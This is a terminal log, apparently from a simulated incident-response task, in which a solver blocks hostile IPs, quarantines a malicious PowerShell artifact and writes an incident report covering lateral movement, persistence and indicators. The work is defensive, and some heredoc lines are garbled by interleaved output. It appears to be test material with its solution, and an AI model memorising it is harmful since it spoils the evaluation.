+[?2004l{"command": "start-service", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl start-service vault-prx-03 archive-transfer
+[?2004l{"command": "start-service", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl block 198.51.100.77
+[?2004l{"command": "block", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl block 203.0.113.201
+[?2004l{"command": "block", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl block 198.51.100.203
+[?2004l{"command": "block", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl verify
+[?2004loperator safety and service-binding checks pass
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ 
+[?2004l[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl quarantine acct-ws-04 FILE-182
+[?2004lirctl: unknown artifact on acct-ws-04: FILE-182
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl block 198.51.100.77
+[?2004l{"command": "block", "ok": true}
+irctl block 203.0.113.201
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl block 203.0.113.201
+[?2004l{"command": "block", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl block 198.51.100.203
+[?2004l{"command": "block", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl verify
+[?2004loperator safety and service-binding checks pass
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ ls -la /evidence/network
+[?2004ltotal 12
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [0m[01;34m.[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34m..[0m
+-r--r--r-- 1 root root  909 Aug 19 23:52 flows.csv
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ ls -la /evidence/memory
+[?2004ltotal 24
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [0m[01;34m.[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34m..[0m
+-r--r--r-- 1 root root  485 Aug 19 23:52 backup-gw-02-processes.csv
+-r--r--r-- 1 root root  290 Aug 19 23:52 backup-gw-02-sockets.csv
+-r--r--r-- 1 root root  530 Aug 19 23:52 vault-prx-03-processes.csv
+-r--r--r-- 1 root root  219 Aug 19 23:52 vault-prx-03-sockets.csv
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ jq -r '.hosts["acct-ws-04"].artifacts | to_entries[] | "\(.key) \(.value.path)"' /case/live/state.json
+[?2004lFILE-221 C:\ProgramData\OneDriveHealth\update.ps1
+FILE-310 C:\Program Files\Ledger\monthend.ps1
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat << 'EOF' > write_report.py
+[?2004l[?2004h> import json
+[?2004l":[?2004h> 
+[?2004l[?2004h> report = {
+[?2004l[?2004h>   "case_id": "FIN-2025-0417",
+[?2004l[?2004h>   "affected_hosts": ["acct-ws-04", "backup-gw-02", "vault-prx-03"],
+[?2004l[?2004h>   "initial_access": {
+[?2004l [{"path": "memory/vault-prx-03-processes.csv", "locator": ".index-cache"}]
+    },
+    {
+      "type": "key_fingerprint",
+      "val[?2004h>     "host": "acct-ws-04",
+[?2004l[?2004h>     "vector": "malicious_document",
+[?2004l[?2004h>     "execution": "powershell",
+[?2004l[?2004h>     "assessment": "confirmed_compromise",
+[?2004l[?2004h>     "evidence": [{"path": "alerts/edr_alerts.jsonl", "locator": "EDR-1042"}]
+[?2004l[?2004h>   },
+[?2004l[?2004h>   "lateral_movement": [
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "source": "acct-ws-04",
+[?2004l[?2004h>       "destination": "backup-gw-02",
+[?2004l[?2004h>       "account": "CORP\\backupsvc",
+[?2004l[?2004h>       "channel": "ssh",
+[?2004l[?2004h>       "assessment": "confirmed_compromise",
+[?2004l[?2004h>       "evidence": [{"path": "windows/sysmon.jsonl", "locator": "SYSMON-2208"}]
+[?2004l
+  ][?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "source": "backup-gw-02",
+[?2004l[?2004h>       "destination": "vault-prx-03",
+[?2004l[?2004h>       "account": "CORP\\vaultsync",
+[?2004l[?2004h>       "channel": "ssh",
+[?2004l[?2004h>       "assessment": "confirmed_compromise",
+[?2004l[?2004h>       "evidence": [{"path": "linux/backup-gw-02-audit.jsonl", "locator": "AUDIT-394"}]
+[?2004l[?2004h>     }
+[?2004l[?2004h>   ],
+[?2004l[?2004h>   "persistence": [
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "host": "acct-ws-04",
+[?2004l[?2004h>       "kind": "registry_run",
+[?2004l[?2004h>       "object": "OneDriveHealth",
+[?2004l[?2004h>       "effect": "execution",
+[?2004l[?2004h>       "assessment": "malicious",
+[?2004l[?2004h>       "evidence": [{"path": "alerts/edr_alerts.jsonl", "locator": "EDR-1043"}]
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "host": "backup-gw-02",
+[?2004l[?2004h>       "kind": "systemd_service",
+[?2004l[?2004h>       "object": "cert-cache.service",
+[?2004l[?2004h>       "effect": "execution",
+[?2004l[?2004h>       "assessment": "malicious",
+[?2004l[?2004h>       "evidence": [{"path": "linux/backup-gw-02-audit.jsonl", "locator": "AUDIT-392"}]
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "host": "backup-gw-02",
+[?2004l[?2004h>       "kind": "ssh_authorized_key",
+[?2004l[?2004h>       "object": "SHA256:Q7aP1Wz4kD9nY2cLm8oRf6vH3sJ5uX0eBqTtN4iKp6M",
+[?2004l[?2004h>       "effect": "reentry",
+[?2004l[?2004h>       "assessment": "malicious",
+[?2004l[?2004h>       "evidence": [{"path": "linux/backup-gw-02-auth.log", "locator": "SHA256:Q7aP1Wz4kD9nY2cLm8oRf6vH3sJ5uX0eBqTtN4iKp6M"}]
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "host": "vault-prx-03",
+[?2004l[?2004h>       "kind": "systemd_service",
+[?2004l[?2004h>       "object": "index-cache.service",
+[?2004l[?2004h>       "effect": "execution",
+[?2004l[?2004h>       "assessment": "malicious",
+[?2004l[?2004h>       "evidence": [{"path": "linux/vault-prx-03-audit.jsonl", "locator": "VAUDIT-772"}]
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "host": "vault-prx-03",
+[?2004l[?2004h>       "kind": "ssh_authorized_key",
+[?2004l[?2004h>       "object": "SHA256:Zx4Kp9Vm2Qa7Nf6Rt1Yw8Hs3Lc5Db0GeUj4Mi7Po2As",
+[?2004l[?2004h>       "effect": "reentry",
+[?2004l[?2004h>       "assessment": "malicious",
+[?2004l[?2004h>       "evidence": [{"path": "linux/vault-prx-03-auth.log", "locator": "SHA256:Zx4Kp9Vm2Qa7Nf6Rt1Yw8Hs3Lc5Db0GeUj4Mi7Po2As"}]
+[?2004l[?2004h>     }
+[?2004l[?2004h>   ],
+[?2004l[?2004h>   "timeline": [
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "time_utc": "2025-04-17T09:12:14Z",
+[?2004l[?2004h>       "kind": "initial_execution",
+[?2004l[?2004h>       "evidence": [{"path": "alerts/edr_alerts.jsonl", "locator": "EDR-1042"}]
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "time_utc": "2025-04-17T09:16:39Z",
+[?2004l[?2004h>       "kind": "credential_access",
+[?2004l[?2004h>       "evidence": [{"path": "windows/sysmon.jsonl", "locator": "SYSMON-2208"}]
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "time_utc": "2025-04-17T09:16:41Z",
+[?2004l[?2004h>       "kind": "lateral_access",
+[?2004l[?2004h>       "evidence": [{"path": "windows/security_events.jsonl", "locator": "WINSEC-8810"}]
+[?2004l[?2004h>     }
+[?2004l[?2004h>   ],
+[?2004l[?2004h>   "indicators": [
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "type": "ip",
+[?2004l[?2004h>       "value": "198.51.100.77",
+[?2004l[?2004h>       "disposition": "hostile",
+[?2004l[?2004h>       "evidence": [{"path": "windows/sysmon.jsonl", "locator": "SYSMON-2201"}]
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "type": "ip",
+[?2004l[?2004h>       "value": "203.0.113.201",
+[?2004l[?2004h>       "disposition": "hostile",
+[?2004l[?2004h>       "evidence": [{"path": "network/flows.csv", "locator": "203.0.113.201"}]
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "type": "ip",
+[?2004l[?2004h>       "value": "198.51.100.203",
+[?2004l[?2004h>       "disposition": "hostile",
+[?2004l[?2004h>       "evidence": [{"path": "network/flows.csv", "locator": "198.51.100.203"}]
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "type": "sha256",
+[?2004l[?2004h>       "value": "27c1b956a376f025da54daeae5b3f9b9d12af076646712a31f4963ee3f743b73",
+[?2004l[?2004h>       "disposition": "hostile",
+[?2004l[?2004h>       "evidence": [{"path": "alerts/edr_alerts.jsonl", "locator": "EDR-1042"}]
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "type": "sha256",
+[?2004l[?2004h>       "value": "74f740bc25ef325f87c3d1db53c6f8bee500f7d5270e15857df24ac7a5b86e82",
+[?2004l[?2004h>       "disposition": "hostile",
+[?2004l[?2004h>       "evidence": [{"path": "memory/backup-gw-02-processes.csv", "locator": "cert_sync.py"}]
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "type": "sha256",
+[?2004l[?2004h>       "value": "5a1ab623fda7df3cda48fc2d29a914c17ae700b3ceb79589d18bbd111b7f402d",
+[?2004l[?2004h>       "disposition": "hostile",
+[?2004l[?2004h>       "evidence": [{"path": "memory/vault-prx-03-processes.csv", "locator": ".index-cache"}]
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "type": "key_fingerprint",
+[?2004l[?2004h>       "value": "SHA256:Q7aP1Wz4kD9nY2cLm8oRf6vH3sJ5uX0eBqTtN4iKp6M",
+[?2004l[?2004h>       "disposition": "hostile",
+[?2004l[?2004h>       "evidence": [{"path": "linux/backup-gw-02-auth.log", "locator": "SHA256:Q7aP1Wz4kD9nY2cLm8oRf6vH3sJ5uX0eBqTtN4iKp6M"}]
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "type": "key_fingerprint",
+[?2004l[?2004h>       "value": "SHA256:Zx4Kp9Vm2Qa7Nf6Rt1Yw8Hs3Lc5Db0GeUj4Mi7Po2As",
+[?2004l[?2004h>       "disposition": "hostile",
+[?2004l[?2004h>       "evidence": [{"path": "linux/vault-prx-03-auth.log", "locator": "SHA256:Zx4Kp9Vm2Qa7Nf6Rt1Yw8Hs3Lc5Db0GeUj4Mi7Po2As"}]
+[?2004l[?2004h>     }
+[?2004l[?2004h>   ]
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> with open("/app/incident_report.json", "w") as f:
+[?2004l[?2004h>     json.dump(report, f, indent=2)
+[?2004l[?2004h> EOF
+[?2004l[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ python3 write_report.py
+[?2004l[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl quarantine acct-ws-04 FILE-221
+[?2004l{"command": "quarantine", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat << 'EOF' > update_timeline.py
+[?2004l[?2004h> import json
+[?2004l[?2004h> 
+[?2004l[?2004h> with open('/app/incident_report.json', 'r') as f:
+[?2004l[?2004h>     report = json.load(f)
+[?2004l[?2004h> 
+[?2004l[?2004h> report['timeline'].extend([
+[?2004l[?2004h>     {
+[?2004l[?2004h>         'time_utc': '2025-04-17T09:20:11Z',
+[?2004l[?2004h>         'kind': 'persistence_activation',
+[?2004l[?2004h>         'evidence': [{'path': 'linux/backup-gw-02-audit.jsonl', 'locator': 'AUDIT-392'}]
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>         'time_utc': '2025-04-17T09:25:21Z',
+[?2004l[?2004h>         'kind': 'persistence_activation',
+[?2004l[?2004h>         'evidence': [{'path': 'linux/vault-prx-03-audit.jsonl', 'locator': 'VAUDIT-772'}]
+[?2004l[?2004h>     }
+[?2004l[?2004h> ])
+[?2004l[?2004h> 
+[?2004l[?2004h> with open('/app/incident_report.json', 'w') as f:
+[?2004l[?2004h>     json.dump(report, f, indent=2)
+[?2004l[?2004h> EOF
+[?2004l[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ python3 update_timeline.py
+[?2004l[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl verify
+[?2004loperator safety and service-binding checks pass
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat << 'EOF' > finalize_report.py
+[?2004l[?2004h> import json
+[?2004l[?2004h> 
+[?2004l[?2004h> with open('/app/incident_report.json', 'r') as f:
+[?2004l[?2004h>     report = json.load(f)
+[?2004l[?2004h> 
+[?2004l[?2004h> # Add the vault-prx-03 lateral access to timeline
+[?2004l[?2004h> report['timeline'].append({
+[?2004l[?2004h>     'time_utc': '2025-04-17T09:23:41Z',
+[?2004l[?2004h>     'kind': 'lateral_access',
+[?2004l[?2004h>     'evidence': [{'path': 'linux/backup-gw-02-audit.jsonl', 'locator': 'AUDIT-394'}]
+[?2004l[?2004h> })
+[?2004l[?2004h> 
+[?2004l[?2004h> # Sort the timeline chronologically
+[?2004l[?2004h> report['timeline'].sort(key=lambda x: x['time_utc'])
+[?2004l[?2004h> 
+[?2004l[?2004h> with open('/app/incident_report.json', 'w') as f:
+[?2004l[?2004h>     json.dump(report, f, indent=2)
+[?2004l[?2004h> EOF
+[?2004l[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ python3 finalize_report.py
+[?2004l[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat /app/incident_report.json
+[?2004l{
+  "case_id": "FIN-2025-0417",
+  "affected_hosts": [
+    "acct-ws-04",
+    "backup-gw-02",
+    "vault-prx-03"
+  ],
+  "initial_access": {
+    "host": "acct-ws-04",
+    "vector": "malicious_document",
+    "execution": "powershell",
+    "assessment": "confirmed_compromise",
+    "evidence": [
+      {
+        "path": "alerts/edr_alerts.jsonl",
+        "locator": "EDR-1042"
+      }
+    ]
+  },
+  "lateral_movement": [
+    {
+      "source": "acct-ws-04",
+      "destination": "backup-gw-02",
+      "account": "CORP\\backupsvc",
+      "channel": "ssh",
+      "assessment": "confirmed_compromise",
+      "evidence": [
+        {
+          "path": "windows/sysmon.jsonl",
+          "locator": "SYSMON-2208"
+        }
+      ]
+    },
+    {
+      "source": "backup-gw-02",
+      "destination": "vault-prx-03",
+      "account": "CORP\\vaultsync",
+      "channel": "ssh",
+      "assessment": "confirmed_compromise",
+      "evidence": [
+        {
+          "path": "linux/backup-gw-02-audit.jsonl",
+          "locator": "AUDIT-394"
+        }
+      ]
+    }
+  ],
+  "persistence": [
+    {
+      "host": "acct-ws-04",
+      "kind": "registry_run",
+      "object": "OneDriveHealth",
+      "effect": "execution",
+      "assessment": "malicious",
+      "evidence": [
+        {
+          "path": "alerts/edr_alerts.jsonl",
+          "locator": "EDR-1043"
+        }
+      ]
+    },
+    {
+      "host": "backup-gw-02",
+      "kind": "systemd_service",
+      "object": "cert-cache.service",
+      "effect": "execution",
+      "assessment": "malicious",
+      "evidence": [
+        {
+          "path": "linux/backup-gw-02-audit.jsonl",
+          "locator": "AUDIT-392"
+        }
+      ]
+    },
+    {
+      "host": "backup-gw-02",
+      "kind": "ssh_authorized_key",
+      "object": "SHA256:Q7aP1Wz4kD9nY2cLm8oRf6vH3sJ5uX0eBqTtN4iKp6M",
+      "effect": "reentry",
+      "assessment": "malicious",
+      "evidence": [
+        {
+          "path": "linux/backup-gw-02-auth.log",
+          "locator": "SHA256:Q7aP1Wz4kD9nY2cLm8oRf6vH3sJ5uX0eBqTtN4iKp6M"
+        }
+      ]
+    },
+    {
+      "host": "vault-prx-03",
+      "kind": "systemd_service",
+      "object": "index-cache.service",
+      "effect": "execution",
+      "assessment": "malicious",
+      "evidence": [
+        {
+          "path": "linux/vault-prx-03-audit.jsonl",
+          "locator": "VAUDIT-772"
+        }
+      ]
+    },
+    {
+      "host": "vault-prx-03",
+      "kind": "ssh_authorized_key",
+      "object": "SHA256:Zx4Kp9Vm2Qa7Nf6Rt1Yw8Hs3Lc5Db0GeUj4Mi7Po2As",
+      "effect": "reentry",
+      "assessment": "malicious",
+      "evidence": [
+        {
+          "path": "linux/vault-prx-03-auth.log",
+          "locator": "SHA256:Zx4Kp9Vm2Qa7Nf6Rt1Yw8Hs3Lc5Db0GeUj4Mi7Po2As"
+        }
+      ]
+    }
+  ],
+  "timeline": [
+    {
+      "time_utc": "2025-04-17T09:12:14Z",
+      "kind": "initial_execution",
+      "evidence": [
+        {
+          "path": "alerts/edr_alerts.jsonl",
+          "locator": "EDR-1042"
+        }
+      ]
+    },
+    {
+      "time_utc": "2025-04-17T09:16:39Z",
+      "kind": "credential_access",
+      "evidence": [
+        {
+          "path": "windows/sysmon.jsonl",
+          "locator": "SYSMON-2208"
+        }
+      ]
+    },
+    {
+      "time_utc": "2025-04-17T09:16:41Z",
+      "kind": "lateral_access",
+      "evidence": [
+        {
+          "path": "windows/security_events.jsonl",
+          "locator": "WINSEC-8810"
+        }
+      ]
+    },
+    {
+      "time_utc": "2025-04-17T09:20:11Z",
+      "kind": "persistence_activation",
+      "evidence": [
+        {
+          "path": "linux/backup-gw-02-audit.jsonl",
+          "locator": "AUDIT-392"
+        }
+      ]
+    },
+    {
+      "time_utc": "2025-04-17T09:23:41Z",
+      "kind": "lateral_access",
+      "evidence": [
+        {
+          "path": "linux/backup-gw-02-audit.jsonl",
+          "locator": "AUDIT-394"
+        }
+      ]
+    },
+    {
+      "time_utc": "2025-04-17T09:25:21Z",
+      "kind": "persistence_activation",
+      "evidence": [
+        {
+          "path": "linux/vault-prx-03-audit.jsonl",
+          "locator": "VAUDIT-772"
+        }
+      ]
+    }
+  ],
+  "indicators": [
+    {
+      "type": "ip",
+      "value": "198.51.100.77",
+      "disposition": "hostile",
+      "evidence": [
+        {
+          "path": "windows/sysmon.jsonl",
+          "locator": "SYSMON-2201"
+        }
+      ]
+    },
+    {
+      "type": "ip",
+      "value": "203.0.113.201",
+      "disposition": "hostile",
+      "evidence": [
+        {
+          "path": "network/flows.csv",
+          "locator": "203.0.113.201"
+        }
+      ]
+    },
+    {
+      "type": "ip",
+      "value": "198.51.100.203",
+      "disposition": "hostile",
+      "evidence": [
+        {
+          "path": "network/flows.csv",
+          "locator": "198.51.100.203"
+        }
+      ]
+    },
+    {
+      "type": "sha256",
+      "value": "27c1b956a376f025da54daeae5b3f9b9d12af076646712a31f4963ee3f743b73",
+      "disposition": "hostile",
+      "evidence": [
+        {
+          "path": "alerts/edr_alerts.jsonl",
+          "locator": "EDR-1042"
+        }
+      ]
+    },
+    {
+      "type": "sha256",
+      "value": "74f740bc25ef325f87c3d1db53c6f8bee500f7d5270e15857df24ac7a5b86e82",
+      "disposition": "hostile",
+      "evidence": [
+        {
+          "path": "memory/backup-gw-02-processes.csv",
+          "locator": "cert_sync.py"
+        }
+      ]
+    },
+    {
+      "type": "sha256",
+      "value": "5a1ab623fda7df3cda48fc2d29a914c17ae700b3ceb79589d18bbd111b7f402d",
+      "disposition": "hostile",
+      "evidence": [
+        {
+          "path": "memory/vault-prx-03-processes.csv",
+          "locator": ".index-cache"
+        }
+      ]
+    },
+    {
+      "type": "key_fingerprint",
+      "value": "SHA256:Q7aP1Wz4kD9nY2cLm8oRf6vH3sJ5uX0eBqTtN4iKp6M",
+      "disposition": "hostile",
+      "evidence": [
+        {
+          "path": "linux/backup-gw-02-auth.log",
+          "locator": "SHA256:Q7aP1Wz4kD9nY2cLm8oRf6vH3sJ5uX0eBqTtN4iKp6M"
+        }
+      ]
+    },
+    {
+      "type": "key_fingerprint",
+      "value": "SHA256:Zx4Kp9Vm2Qa7Nf6Rt1Yw8Hs3Lc5Db0GeUj4Mi7Po2As",
+      "disposition": "hostile",
+      "evidence": [
+        {
+          "path": "linux/vault-prx-03-auth.log",
+          "locator": "SHA256:Zx4Kp9Vm2Qa7Nf6Rt1Yw8Hs3Lc5Db0GeUj4Mi7Po2As"
+        }
+      ]
+    }
+  ]
+}[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ 
